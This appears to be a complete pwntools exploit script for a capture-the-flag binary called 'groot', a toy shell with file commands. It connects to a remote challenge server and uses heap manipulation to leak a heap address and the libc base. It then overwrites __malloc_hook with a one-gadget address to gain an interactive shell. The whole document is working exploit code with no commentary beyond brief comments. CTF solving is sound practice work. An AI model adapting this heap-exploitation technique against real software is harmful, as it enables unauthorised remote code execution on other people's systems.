#!/usr/bin/env python
from pwn import *

def command(cmd):
    s.sendlineafter('$ ', cmd)

def touch(name):
    command('touch %s' % name)

def mkfile(name, content):
    command('mkfile %s' % name)
    s.sendlineafter('Content? ', content)

def rm(name):
    command('rm %s' % name)

def mkdir(name):
    command('mkdir %s' % name)

def cd(name):
    command('cd %s' % name)

def cat(name):
    command('cat %s' % name)

def ls(name = ''):
    command('ls %s' % name)

if len(sys.argv) == 1:
    s = process('./groot')
else:
    s = remote('54.238.202.201', 31733)

elf = ELF('./groot')
libc = ELF('./libc.so.6')

# leak heap address
mkdir('A')
cd('A')
mkfile('a' * 0x40, 'A' * 0x40)
mkfile('b' * 0x40, 'B' * 0x40)
cd('..')
rm('A')
mkdir('A')
cd('A')
ls()
time.sleep(0.1)
s.recv(0x19)
heap_addr = u64(s.recv(6).ljust(8, '\0'))
log.info('heap address: %#x' % heap_addr)

mkfile('a' * 0x30, 'A' * 0x30)
cd('..')

# leak libc base
mkdir('B')
mkdir('C')
cd('C')
mkfile('a' * 0x30, 'A')
cd('..')
mkdir('X' * 0x50)
for i in range(0x20):
    mkdir(chr(ord('a') + i) * 0x20)
rm('X' * 0x50)
cd('B')
mkfile('a', 'A')
cd('..')
rm('B')
mkdir('A' * 0x20)
for i in range(0x20):
    rm(chr(ord('a') + i) * 0x20)
rm('A' * 0x20)
mkdir('B' * 0x20)
cd('B' * 0x20)
mkfile(p64(heap_addr + 0x220), 'Z')
mkfile('a', 'A')
mkfile('A' * 8 + p64(0x511), 'B')
cd('..')
rm('C')
mkdir('C')
ls('C')
s.recv(0x14)
libc_base = u64(s.recv(6).ljust(8, '\0')) - 0x3ebca0
log.info('libc base: %#x' % libc_base)

# overwrite __malloc_hook with one-gadget RCE
mkfile('d' * 0x30, 'D' * 0x30)
mkdir('e' * 0x50)
rm('e' * 0x50)
mkfile('f' * 0x20, 'F' * 0x20)
mkfile(p64(libc_base + libc.symbols['__malloc_hook'] - 0x48), 'G' * 0x59)
cd('../..')
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
mkfile('d' * 0x50, 'D')
mkfile('X' * 0x48 + p64(libc_base + one_gadgets[2]), 'x')

s.interactive()
